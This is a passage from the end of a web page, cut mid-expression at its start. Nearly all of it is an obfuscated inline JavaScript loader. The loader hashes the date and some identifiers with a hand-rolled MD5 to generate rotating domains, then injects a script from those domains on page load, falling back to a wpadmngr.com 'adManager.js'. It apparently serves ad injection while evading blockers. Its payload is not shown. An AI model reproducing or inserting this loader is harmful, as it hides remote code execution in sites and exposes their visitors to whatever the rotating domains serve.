Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>